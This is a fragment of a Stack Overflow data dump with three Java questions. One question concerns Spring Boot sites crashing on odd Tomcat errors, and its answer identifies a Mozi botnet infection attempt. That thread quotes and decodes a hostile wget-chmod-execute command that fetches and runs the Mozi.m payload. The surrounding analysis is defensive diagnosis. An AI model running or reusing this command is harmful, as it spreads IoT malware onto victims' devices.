configuration\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/woCWZ.png","title":"Gradle only run test","body":"<p>I am new to gradle+java. I a use Intellij to debug a sophisticated unit test case on an algorithm. The problem is every time after I click the 'debug' button, it takes long time (~2min) to start my test case, and from the log as following, it seems gradle is checking dependencies first and there are hundreds of them. Since most of the time I just re-trigger the debugger with no or very little change(no dependency related) to test code. How can I skip the dependency checking and only build the test file when there is a change?</p>\n<pre><code>Parallel execution with configuration on demand is an incubating feature.\n&gt; Task :corporate:common:processResources NO-SOURCE\n...\nhundreds tasks\n...\n&gt; Task :indexing:signals:user:testClasses UP-TO-DATE\n&gt; Task :indexing:signals:user:test   &lt;= my test case there\n</code></pre>\n<p>The Intellij debug configuration</p>\n<p><a href=\"https://i.stack.imgur.com/woCWZ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/woCWZ.png\" alt=\"enter image description here\" /></a></p>\n"},{"tags":["java","spring","spring-boot","docker","web"],"answers":[{"tags":[],"owner":{"account_id":3057249,"reputation":1522,"user_id":2590615,"display_name":"de-jcup"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1642495318,"creation_date":1642489328,"answer_id":70751455,"question_id":70750961,"body_markdown":"### TL;DR\r\nYour system / router is under attack - it looks like somebody is trying to install &quot;Mozi malware&quot; - see https://blog.lumen.com/new-mozi-malware-family-quietly-amasses-iot-bots/ \r\n\r\n#### Details\r\nYour tomcat is called with something not really being a HTML method. So the caller - whatever it is - does very strange things. It looks like a script is sent instead of HTTP message.\r\n\r\n&gt; ...After a certain amount of time all of these sites go down...\r\n\r\nLooks like a denial of service because extreme bad network traffic.\r\n\r\n\r\n### Analyze\r\n\r\nLet&#39;s analyze your output:\r\n```\r\njava.lang.IllegalArgumentException: Invalid character found in method name [27;wget%20http://%s:%d/Mozi.m%20-O%20-&gt;%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$]. HTTP method names must be tokens\r\n    at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.39.jar!/:9.0.39]\r\n```\r\nReading the implementation we see\r\n```java\r\n// from Http11InputBuffer.java ... (tomcat-embed-core-9.0.48.jar)\r\n\r\n    // Avoid unknown protocol triggering an additional error\r\n    request.protocol().setString(Constants.HTTP_11);\r\n    String invalidMethodValue = parseInvalid(parsingRequestLineStart, byteBuffer);\r\n    throw new IllegalArgumentException(sm.getString(&quot;iib.invalidmethod&quot;, invalidMethodValue));\r\n\r\n//...\r\n```\r\n\r\nHaving message properties file containing:\r\n```properties\r\niib.invalidmethod=Invalid character found in method name [{0}]. HTTP method names must be tokens\r\n```\r\n\r\nand your given exception the string (0) is:\r\n\r\n`27;wget%20http://%s:%d/Mozi.m%20-O%20-&gt;%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$`\r\n\r\nunencoded:\r\n```\r\n\r\n&#39;wget http://%s:%d/Mozi.m -O -&gt; /tmp/Mozi.m;chmod 777  /tmp/Mozi.m;/tmp/Mozi.m dlink.mips $&#39;\r\n\r\n```\r\nLooks like a script is sent which tries to fetch something called &quot;Mozi.m&quot;, makes it executable and call it... ups...\r\n\r\n\r\nSo....doing a simple internet research about &quot;Mozi.m&quot;...\r\nI found: \r\n- https://www.virustotal.com/gui/file/e629334def73be9e166ecdd9d5d73d6be97ef7f7d16f05383892332acb324b73/detection/f-e629334\r\n- https://blog.lumen.com/new-mozi-malware-family-quietly-amasses-iot-bots/\r\n\r\nSo IMO it looks like there is somebody is attacking the routers with mass HTTP requests, trying to break in. The routers forward the malicous request and tomcat does handle and reject them (correctly) but having too many requests the system goes down...\r\n\r\n### Further steps\r\nConsult your cyber security department or consult a security expert and investigate as soon as possible what happened and if your system was tampered/hijacked. \r\n\r\nIMO those requests should be filtered before tomcat.\r\n\r\n\r\n\r\n","title":"Unrecognized method names crashing springboot sites","body":"<h3>TL;DR</h3>\n<p>Your system / router is under attack - it looks like somebody is trying to install &quot;Mozi malware&quot; - see <a href=\"https://blog.lumen.com/new-mozi-malware-family-quietly-amasses-iot-bots/\" rel=\"nofollow noreferrer\">https://blog.lumen.com/new-mozi-malware-family-quietly-amasses-iot-bots/</a></p>\n<h4>Details</h4>\n<p>Your tomcat is called with something not really being a HTML method. So the caller - whatever it is - does very strange things. It looks like a script is sent instead of HTTP message.</p>\n<blockquote>\n<p>...After a certain amount of time all of these sites go down...</p>\n</blockquote>\n<p>Looks like a denial of service because extreme bad network traffic.</p>\n<h3>Analyze</h3>\n<p>Let's analyze your output:</p>\n<pre><code>java.lang.IllegalArgumentException: Invalid character found in method name [27;wget%20http://%s:%d/Mozi.m%20-O%20-&gt;%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$]. HTTP method names must be tokens\n    at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.39.jar!/:9.0.39]\n</code></pre>\n<p>Reading the implementation we see</p>\n<pre class=\"lang-java prettyprint-override\"><code>// from Http11InputBuffer.java ... (tomcat-embed-core-9.0.48.jar)\n\n    // Avoid unknown protocol triggering an additional error\n    request.protocol().setString(Constants.HTTP_11);\n    String invalidMethodValue = parseInvalid(parsingRequestLineStart, byteBuffer);\n    throw new IllegalArgumentException(sm.getString(&quot;iib.invalidmethod&quot;, invalidMethodValue));\n\n//...\n</code></pre>\n<p>Having message properties file containing:</p>\n<pre><code>iib.invalidmethod=Invalid character found in method name [{0}]. HTTP method names must be tokens\n</code></pre>\n<p>and your given exception the string (0) is:</p>\n<p><code>27;wget%20http://%s:%d/Mozi.m%20-O%20-&gt;%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$</code></p>\n<p>unencoded:</p>\n<pre><code>\n'wget http://%s:%d/Mozi.m -O -&gt; /tmp/Mozi.m;chmod 777  /tmp/Mozi.m;/tmp/Mozi.m dlink.mips $'\n\n</code></pre>\n<p>Looks like a script is sent which tries to fetch something called &quot;Mozi.m&quot;, makes it executable and call it... ups...</p>\n<p>So....doing a simple internet research about &quot;Mozi.m&quot;...\nI found:</p>\n<ul>\n<li><a href=\"https://www.virustotal.com/gui/file/e629334def73be9e166ecdd9d5d73d6be97ef7f7d16f05383892332acb324b73/detection/f-e629334\" rel=\"nofollow noreferrer\">https://www.virustotal.com/gui/file/e629334def73be9e166ecdd9d5d73d6be97ef7f7d16f05383892332acb324b73/detection/f-e629334</a></li>\n<li><a href=\"https://blog.lumen.com/new-mozi-malware-family-quietly-amasses-iot-bots/\" rel=\"nofollow noreferrer\">https://blog.lumen.com/new-mozi-malware-family-quietly-amasses-iot-bots/</a></li>\n</ul>\n<p>So IMO it looks like there is somebody is attacking the routers with mass HTTP requests, trying to break in. The routers forward the malicous request and tomcat does handle and reject them (correctly) but having too many requests the system goes down...</p>\n<h3>Further steps</h3>\n<p>Consult your cyber security department or consult a security expert and investigate as soon as possible what happened and if your system was tampered/hijacked.</p>\n<p>IMO those requests should be filtered before tomcat.</p>\n"}],"owner":{"account_id":20741643,"reputation":11,"user_id":15231139,"display_name":"dassoop"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":623,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"closed_date":1642517961,"answer_count":1,"score":-2,"last_activity_date":1642495318,"creation_date":1642485868,"question_id":70750961,"body_markdown":"I have several sites built with springs boot and deployed on EC2 Instances with Docker. After a certain amount of time all of these sites go down. When I check the Docker container logs I see IllegalArgumentExceptions like this one with long cryptic looking method names. Any idea what could be causing this? The deployment is an EC2 instance with Docker-Compose building a springboot container, a mysql container, and a mysql-backup container. \r\n\r\n\r\n```\r\njava.lang.IllegalArgumentException: Invalid character found in method name [27;wget%20http://%s:%d/Mozi.m%20-O%20-&gt;%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$]. HTTP method names must be tokens\r\n\tat org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.39.jar!/:9.0.39]\r\n\tat org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.39.jar!/:9.0.39]\r\n\tat org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\r\n\tat org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\r\n\tat org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\r\n\tat org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_212]\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_212]\r\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\r\n\tat java.lang.Thread.run(Thread.java:748) [na:1.8.0_212]\r\n```","title":"Unrecognized method names crashing springboot sites","body":"<p>I have several sites built with springs boot and deployed on EC2 Instances with Docker. After a certain amount of time all of these sites go down. When I check the Docker container logs I see IllegalArgumentExceptions like this one with long cryptic looking method names. Any idea what could be causing this? The deployment is an EC2 instance with Docker-Compose building a springboot container, a mysql container, and a mysql-backup container.</p>\n<pre><code>java.lang.IllegalArgumentException: Invalid character found in method name [27;wget%20http://%s:%d/Mozi.m%20-O%20-&gt;%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$]. HTTP method names must be tokens\n    at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.39.jar!/:9.0.39]\n    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.39.jar!/:9.0.39]\n    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\n    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\n    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\n    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\n    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_212]\n    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_212]\n    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.39.jar!/:9.0.39]\n    at java.lang.Thread.run(Thread.java:748) [na:1.8.0_212]\n</code></pre>\n"},{"tags":["java","multithreading"],"comments":[{"owner":{"account_id":216950,"reputation":20103,"user_id":472495,"accept_rate":92,"display_name":"halfer"},"score":1,"creation_date":1642373575,"post_id":70732854,"comment_id":125047595,"body_markdown":"Are you required to use threads for this, e.g. for an academic assignment? I personally would not use them - since it is a console app, the computer can just keep track of whether it is the computer or the human&#39;s turn, and let the computer make a move after every human move (assuming all human moves require new console input).","body":"Are you required to use threads for this, e.g. for an academic assignment? I personally would not use them - since it is a console app, the computer can just keep track of whether it is the computer or the human&#39;s turn, and let the computer make a move after every human move (assuming all human moves require new console input)."},{"owner":{"account_id":6718421,"reputation":147,"user_id":5179458,"accept_rate":0,"display_name":"wajde"},"score":0,"creation_date":1642445047,"post_id":70732854,"comment_id":125067631,"body_markdown":"yeah, it&#39;s for an academic assignment ! I agree, but we used threads so we can practice for practice ! also in part 2 of the assignment I&#39;ll Build GUI and implement sockets ! so if so , I think using threads is ok, do you agree ? also, i figured that the threads should be synchronized based on the curentPLayerTurn variable somehow, unfortiaintly didn&#39;t implement that yet @halfer","body":"yeah, it&#39;s for an academic assignment ! I agree, but we used threads so we can practice for practice ! also in part 2 of the assignment I&#39;ll Build GUI and implement sockets ! so if so , I think using threads is ok, do you agree ? also, i figured that the threads should be synchronized based on the curentPLayerTurn variable somehow, unfortiaintly didn&#39;t implement that yet @halfer"},{"owner":{"account_id":216950,"reputation":20103,"user_id":472495,"accept_rate":92,"display_name":"halfer"},"score":1,"creation_date":1642446438,"post_id":70732854,"comment_id":125068036,"body_markdown":"I disagree, I would not use threads for this. I am not an expert, but I don&#39;t think you can use threads anyway, if you are looking to gather user input. Thread isolation is meant to happen over microseconds, not over a number of seconds. I would advise talking to your course supervisor before going any further.","body":"I disagree, I would not use threads for this. I am not an expert, but I don&#39;t think you can use threads anyway, if you are looking to gather user input. Thread isolation is meant to happen over microseconds, not over a number of seconds. I would advise talking to your course supervisor before going any further."}],"owner":{"account_id":6718421,"reputation":147,"user_id":5179458,"accept_rate":0,"display_name":"wajde"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":278,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642495052,"creation_date":1642356999,"question_id":70732854,"body_markdown":"I followed some discussion on the website and implemented some suggestions but I was not able to complete the task.\r\n\r\nI have this assignment to build Tic Tac Toe game in Java.\r\n\r\nThere&#39;s a lot of tutorials on the web I know, but I wanted to build it using threads for each player so that only one player at a time could enter X/O to the board and I was not able to figure out the implementation for the wait/ notify.\r\n\r\nTo be honest, I find it a bit confusing! I guess the logic is 90% done, and I am wondering how to finish it.\r\n\r\nBasically, I have these classes: \r\n\r\n```\r\nabstract public class Player extends Thread \r\n\r\npublic class HumanPlayer extends Player \r\npublic class MachinePlayer  extends  Player \r\npublic class Board \r\npublic class Game  \r\npublic class Main \r\n\r\n```\r\n\r\nI&#39;ll paste first the players classes. Notice the run method I tried to Synchronize on top of the gameOver variable:\r\n\r\nPlayer.java\r\n```\r\nabstract public class Player extends Thread {\r\n\r\n    abstract int getMyTurn() ;\r\n    abstract String  getPlayerName() ;\r\n    abstract void  setPlayerName(String n ) ;\r\n\r\n    abstract  void setSign(int n ) ;\r\n\r\n    abstract  int getSign() ;\r\n\r\n}\r\n```\r\n\r\nMachinePlayer.java\r\n\r\n```\r\nimport java.util.Random;\r\n\r\npublic class MachinePlayer  extends  Player {\r\n    private String name ;\r\n    private int sign ;\r\n    Board board ;\r\n\r\n    public MachinePlayer(Board board) {\r\n        this.board = board;\r\n    }\r\n\r\n    @Override\r\n    public void run() {\r\n        System.out.println(&quot;Player &quot;+name+&quot; turn:&quot; );\r\n        while (!board.isGameOver())\r\n        {\r\n            board.setCurrentPlayerTurn(this.getSign()); // i think it keeps track of which player is holding the lock ?\r\n            Move move = generateRandomMove();\r\n            board.makeMove(this, move.getX(), move.getY() );\r\n        }\r\n\r\n    }\r\n\r\n    @Override\r\n    int getMyTurn() {\r\n        return 0;\r\n    }\r\n\r\n    @Override\r\n    public String getPlayerName() {\r\n        return name;\r\n    }\r\n\r\n    @Override\r\n    public void setPlayerName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n\r\n    @Override\r\n    void setSign(int sign) {\r\n        this.sign  = sign ;\r\n    }\r\n\r\n    @Override\r\n    int getSign() {\r\n        return sign;\r\n    }\r\n\r\n    private Move generateRandomMove(){\r\n        while (true)\r\n        {\r\n            int x = getRandomNumber(0,board.getBoardSize()) ;\r\n            int y = getRandomNumber(0,board.getBoardSize()) ;\r\n            if (board.isPositionAvalabile(x, y ))\r\n            {\r\n                return new Move(x,y);\r\n            }\r\n        }\r\n    // todo implement the best move !\r\n    }\r\n\r\n    public int getRandomNumber(int min, int max) {\r\n        return (int) ((Math.random() * (max - min)) + min);\r\n    }\r\n\r\n}\r\n```\r\n\r\nHumanPlayer.java\r\n\r\n```\r\npublic class HumanPlayer extends Player {\r\n    private String name ;\r\n    private int  sign ;\r\n    private Board board ;\r\n\r\n    public HumanPlayer(Board board) {\r\n        this.board = board;\r\n    }\r\n\r\n\r\n    @Override\r\n    public void run() {\r\n        while (!board.isGameOver())\r\n        {\r\n            board.setCurrentPlayerTurn(this.getSign()); // I think it keeps track of which player is holding the lock ?\r\n            Move move = requestMoveFormHuman(); // request move for human player // will be changed in the GUI?\r\n            board.makeMove(this, move.getX() , move.getY()); // check for move logic here  &gt;\r\n        }\r\n    }\r\n\r\n\r\n    @Override\r\n    int getSign() {\r\n        return sign;\r\n    }\r\n\r\n    @Override\r\n    int getMyTurn() {\r\n        return 0;\r\n    }\r\n\r\n\r\n    @Override\r\n    public String getPlayerName() {\r\n        return name;\r\n    }\r\n\r\n    @Override\r\n    public void setPlayerName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    @Override\r\n    void setSign(int n) {\r\n        this.sign = n ;\r\n    }\r\n\r\n    // logic\r\n    private Move requestMoveFormHuman(){\r\n        int i=0 ;\r\n        while (true)\r\n        {\r\n            System.out.println(i);\r\n            Move move = requestMove() ;\r\n            int x = move.getX();\r\n            int y = move.getY();\r\n            if (board.isPositionAvalabile(x,y))\r\n            {\r\n                return new Move(x,y);\r\n            }\r\n        }\r\n\r\n    }\r\n\r\n    private Move requestMove() {\r\n        System.out.println(&quot;Player &quot;+name+&quot; turn:&quot; );\r\n        System.out.println(&quot;Enter Row  number: &quot;);\r\n        int x = ScanInt();\r\n        System.out.println(&quot;Enter Coulmn  number &quot;);\r\n        int y =  ScanInt();\r\n        return new Move(x ,y ) ;\r\n    }\r\n\r\n    private int ScanInt(){\r\n        Scanner scan = new Scanner(System.in);\r\n\r\n        // This method reads the number provided using keyboard\r\n        int num = scan.nextInt();\r\n\r\n        // Closing Scanner after the use\r\n        return  num;\r\n    }\r\n\r\n\r\n\r\n}\r\n```\r\n\r\nMain.java\r\n\r\n```\r\npublic class Main {\r\n    public static void main(String[] args) {\r\n\r\n        Game game = new Game() ;\r\n        game.start();\r\n    }\r\n}\r\n```\r\n\r\nBoard.java\r\n\r\n```\r\nimport java.util.HashMap;\r\nimport java.util.Scanner;\r\n\r\npublic class Board {\r\n    private int  currentPlayerTurn = 0 ;\r\n\r\n\r\n    public int getBoardSize() {\r\n        return boardSize;\r\n    }\r\n\r\n    private int boardSize ;\r\n    private int[][] board_values ;\r\n    private boolean gameOver ;\r\n\r\n    private HashMap&lt;String , String&gt;  result_history;\r\n\r\n    public Board(int boardSize) {\r\n        this.boardSize = boardSize;\r\n\r\n        board_values = new int[boardSize][boardSize];\r\n        for (int i = 0; i &lt; boardSize; i++) {\r\n            for (int j = 0 ; j &lt; boardSize; j++)\r\n                board_values[i][j] = 0 ;\r\n        }\r\n        System.out.println(&quot;&quot;);\r\n    }\r\n\r\n    private String getSign(int n) {\r\n        if (n==1)\r\n            return &quot;X&quot; ;\r\n        if (n==2)\r\n            return &quot;0&quot; ;\r\n        return &quot; &quot; ; // empty cell\r\n    }\r\n\r\n    public  void printBoard(){\r\n        // todo change to ui components\r\n        for (int i = 0  ; i &lt; boardSize ; i++)\r\n        {\r\n            for (int j = 0  ; j &lt; boardSize ; j++)\r\n            {\r\n                System.out.print(&quot;|&quot;);\r\n                System.out.print(&quot; &quot; + getSign(board_values[i][j])+ &quot; &quot;);\r\n                System.out.print(&quot;|&quot;);\r\n            }\r\n            System.out.println(&quot;&quot;);\r\n            System.out.println(&quot;----------------------------------&quot; );\r\n        }\r\n    }\r\n\r\n\r\n    /** is this the Synchronized one ?  */\r\n    public  boolean makeMove(Player player , int x , int y ) {\r\n\r\n            /*Update Board Value\r\n            insert 1 in the 2d board at x,y for player 1\r\n            insert 2 in the 2d board at x,y for player 2\r\n            */\r\n            int sign = player.getSign();\r\n\r\n            updateBoard(x,y , sign ) ;\r\n\r\n            /*print Board*/\r\n            printBoard();\r\n\r\n            /* check for winner */\r\n             doWeHaveAwinner(x,y , sign);\r\n\r\n        return  true ;\r\n    }\r\n\r\n    /*check the whole row (x)  for if  all signs are equals\r\n    , checks the whole column (x) for if  all signs are equals\r\n    check diagonal  if x=y */\r\n    private boolean doWeHaveAwinner(int x, int y, int sign) {\r\n        // TODO: 16/01/2022\r\n        return false ;\r\n\r\n    }\r\n\r\n    private void updateBoard(int x, int y , int sign ) {\r\n        board_values[x][y] = sign ;\r\n    }\r\n\r\n\r\n    public boolean isPositionAvalabile(int x , int y ){\r\n        return !(x&gt;this.boardSize ||  x &lt; 0  || y&gt;this.boardSize || y &lt; 0) ;\r\n    }\r\n\r\n    private void checkMove() {\r\n        // todo &gt; ?\r\n    }\r\n    private void resetBoard(){\r\n        // todo set al values to 0\r\n\r\n    }\r\n    private void updateResultHistory(){\r\n        // TODO: 16/01/2022 update &lt;Winner Name , Ps+1 &gt;\r\n    }\r\n\r\n\r\n    private int ScanInt(){\r\n        Scanner scan = new Scanner(System.in);\r\n        System.out.print(&quot;Enter any number: &quot;);\r\n\r\n        // This method reads the number provided using keyboard\r\n        int num = scan.nextInt();\r\n\r\n        // Closing Scanner after the use\r\n        return  num;\r\n    }\r\n\r\n    /*Get Set*/\r\n    public synchronized boolean isGameOver() {\r\n        return gameOver;\r\n    }\r\n\r\n    public void setGameOver(boolean gameOver) {\r\n        this.gameOver = gameOver;\r\n    }\r\n\r\n    public int getCurrentPlayerTurn() {\r\n        return currentPlayerTurn;\r\n    }\r\n\r\n    public void setCurrentPlayerTurn(int currentPlayerTurn) {\r\n        this.currentPlayerTurn = currentPlayerTurn;\r\n    }\r\n}\r\n```\r\n\r\nAnd here is Game.java, it basically inits 2 players.\r\n\r\nNotice that in each player init I passed the board instance as a parameter.\r\n\r\nIt might a look little bit messy but I think passing the board instance for the players is the important thing here. Also I called the player1().start and player2.start()\r\n\r\nGame.java\r\n\r\n```\r\npublic class Game  {\r\n    private Player player1 ;\r\n    private Player player2 ;\r\n    private Board board ;\r\n\r\n    private void initBoard(){\r\n        /* request board size */\r\n        int board_size = requestBoardSize();\r\n        board = new Board(board_size); // Synchronized class fields ?\r\n    }\r\n\r\n    private  void initGameMode(){\r\n        /*\r\n        init the players  objects as follows\r\n        1 - for human-machine game\r\n        2 - for machine-human game, and\r\n        3 - for human-human game\r\n        */\r\n\r\n        System.out.println(Utils.str_gameType);\r\n        Scanner scanner  = new Scanner( System.in);\r\n        int game_mode = scanner.nextInt( );\r\n\r\n        switch (game_mode) {\r\n            case 1:\r\n                /* init game type1  human-machine Game*/\r\n                player1 = new HumanPlayer(board);\r\n                player2 = new MachinePlayer(board);\r\n\r\n                break;\r\n            case 2:\r\n                player1 = new MachinePlayer(board);\r\n                player2 = new HumanPlayer(board);\r\n                break;\r\n            case 3:\r\n                player1 = new HumanPlayer(board);\r\n                player2 = new HumanPlayer(board);\r\n                break;\r\n\r\n            default:\r\n                throw new IllegalStateException(&quot;Unexpected value: &quot; + game_mode);\r\n\r\n        }\r\n\r\n        player1.setSign(1);\r\n        player2.setSign(2);\r\n        System.out.println(&quot;&quot;);\r\n    }\r\n\r\n    private void initPlayersName(){\r\n        /*request name player 1  */\r\n        System.out.println(Utils.str_player1Name); /*Scan first name*/\r\n        Scanner scan1 = new Scanner(System.in);\r\n        String name1 = scan1.next();\r\n        player1.setPlayerName(name1);\r\n\r\n\r\n        /*request name player 2  */\r\n        System.out.println(Utils.str_player2Name); /*Scan first name*/\r\n        Scanner scan2 = new Scanner(System.in);\r\n        String name2 = scan2.next();\r\n        player2.setPlayerName(name2);\r\n\r\n\r\n\r\n    }\r\n\r\n    public Game() {\r\n        System.out.println(Utils.str_start_game);\r\n        initBoard();\r\n        initGameMode();\r\n        initPlayersName();\r\n    }\r\n\r\n    public void start() {\r\n        // todo change who starts first\r\n        player1.start();\r\n        new Thread(new Runnable() {\r\n            @Override\r\n            public void run() {\r\n                try {\r\n                    Thread.sleep(300);\r\n                    player2.start();\r\n                }catch (Exception e)\r\n                {\r\n\r\n                }\r\n            }\r\n        }).start();\r\n\r\n\r\n    }\r\n\r\n    private int requestBoardSize() {\r\n        System.out.println(Utils.str_request_board_size);\r\n        Scanner scanner = new Scanner(System.in) ;\r\n        int i =  scanner.nextInt() ;\r\n        return i ;\r\n\r\n    }\r\n    \r\n}///End of Class\r\n```\r\n\r\n\r\n\r\n\r\n\r\n","title":"How to make two Threads wait and notify the correct way in Tic Tac Toe game","body":"<p>I followed some discussion on the website and implemented some suggestions but I was not able to complete the task.</p>\n<p>I have this assignment to build Tic Tac Toe game in Java.</p>\n<p>There's a lot of tutorials on the web I know, but I wanted to build it using threads for each player so that only one player at a time could enter X/O to the board and I was not able to figure out the implementation for the wait/ notify.</p>\n<p>To be honest, I find it a bit confusing! I guess the logic is 90% done, and I am wondering how to finish it.</p>\n<p>Basically, I have these classes:</p>\n<pre><code>abstract public class Player extends Thread \n\npublic class HumanPlayer extends Player \npublic class MachinePlayer  extends  Player \npublic class Board \npublic class Game  \npublic class Main \n\n</code></pre>\n<p>I'll paste first the players classes. Notice the run method I tried to Synchronize on top of the gameOver variable:</p>\n<p>Player.java</p>\n<pre><code>abstract public class Player extends Thread {\n\n    abstract int getMyTurn() ;\n    abstract String  getPlayerName() ;\n    abstract void  setPlayerName(String n ) ;\n\n    abstract  void setSign(int n ) ;\n\n    abstract  int getSign() ;\n\n}\n</code></pre>\n<p>MachinePlayer.java</p>\n<pre><code>import java.util.Random;\n\npublic class MachinePlayer  extends  Player {\n    private String name ;\n    private int sign ;\n    Board board ;\n\n    public MachinePlayer(Board board) {\n        this.board = board;\n    }\n\n    @Override\n    public void run() {\n        System.out.println(&quot;Player &quot;+name+&quot; turn:&quot; );\n        while (!board.isGameOver())\n        {\n            board.setCurrentPlayerTurn(this.getSign()); // i think it keeps track of which player is holding the lock ?\n            Move move = generateRandomMove();\n            board.makeMove(this, move.getX(), move.getY() );\n        }\n\n    }\n\n    @Override\n    int getMyTurn() {\n        return 0;\n    }\n\n    @Override\n    public String getPlayerName() {\n        return name;\n    }\n\n    @Override\n    public void setPlayerName(String name) {\n        this.name = name;\n    }\n\n\n    @Override\n    void setSign(int sign) {\n        this.sign  = sign ;\n    }\n\n    @Override\n    int getSign() {\n        return sign;\n    }\n\n    private Move generateRandomMove(){\n        while (true)\n        {\n            int x = getRandomNumber(0,board.getBoardSize()) ;\n            int y = getRandomNumber(0,board.getBoardSize()) ;\n            if (board.isPositionAvalabile(x, y ))\n            {\n                return new Move(x,y);\n            }\n        }\n    // todo implement the best move !\n    }\n\n    public int getRandomNumber(int min, int max) {\n        return (int) ((Math.random() * (max - min)) + min);\n    }\n\n}\n</code></pre>\n<p>HumanPlayer.java</p>\n<pre><code>public class HumanPlayer extends Player {\n    private String name ;\n    private int  sign ;\n    private Board board ;\n\n    public HumanPlayer(Board board) {\n        this.board = board;\n    }\n\n\n    @Override\n    public void run() {\n        while (!board.isGameOver())\n        {\n            board.setCurrentPlayerTurn(this.getSign()); // I think it keeps track of which player is holding the lock ?\n            Move move = requestMoveFormHuman(); // request move for human player // will be changed in the GUI?\n            board.makeMove(this, move.getX() , move.getY()); // check for move logic here  &gt;\n        }\n    }\n\n\n    @Override\n    int getSign() {\n        return sign;\n    }\n\n    @Override\n    int getMyTurn() {\n        return 0;\n    }\n\n\n    @Override\n    public String getPlayerName() {\n        return name;\n    }\n\n    @Override\n    public void setPlayerName(String name) {\n        this.name = name;\n    }\n\n    @Override\n    void setSign(int n) {\n        this.sign = n ;\n    }\n\n    // logic\n    private Move requestMoveFormHuman(){\n        int i=0 ;\n        while (true)\n        {\n            System.out.println(i);\n            Move move = requestMove() ;\n            int x = move.getX();\n            int y = move.getY();\n            if (board.isPositionAvalabile(x,y))\n            {\n                return new Move(x,y);\n            }\n        }\n\n    }\n\n    private Move requestMove() {\n        System.out.println(&quot;Player &quot;+name+&quot; turn:&quot; );\n        System.out.println(&quot;Enter Row  number: &quot;);\n        int x = ScanInt();\n        System.out.println(&quot;Enter Coulmn  number &quot;);\n        int y =  ScanInt();\n        return new Move(x ,y ) ;\n    }\n\n    private int ScanInt(){\n        Scanner scan = new Scanner(System.in);\n\n        // This method reads the number provided using keyboard\n        int num = scan.nextInt();\n\n        // Closing Scanner after the use\n        return  num;\n    }\n\n\n\n}\n</code></pre>\n<p>Main.java</p>\n<pre><code>public class Main {\n    public static void main(String[] args) {\n\n        Game game = new Game() ;\n        game.start();\n    }\n}\n</code></pre>\n<p>Board.java</p>\n<pre><code>import java.util.HashMap;\nimport java.util.Scanner;\n\npublic class Board {\n    private int  currentPlayerTurn = 0 ;\n\n\n    public int getBoardSize() {\n        return boardSize;\n    }\n\n    private int boardSize ;\n    private int[][] board_values ;\n    private boolean gameOver ;\n\n    private HashMap&lt;String , String&gt;  result_history;\n\n    public Board(int boardSize) {\n        this.boardSize = boardSize;\n\n        board_values = new int[boardSize][boardSize];\n        for (int i = 0; i &lt; boardSize; i++) {\n            for (int j = 0 ; j &lt; boardSize; j++)\n                board_values[i][j] = 0 ;\n        }\n        System.out.println(&quot;&quot;);\n    }\n\n    private String getSign(int n) {\n        if (n==1)\n            return &quot;X&quot; ;\n        if (n==2)\n            return &quot;0&quot; ;\n        return &quot; &quot; ; // empty cell\n    }\n\n    public  void 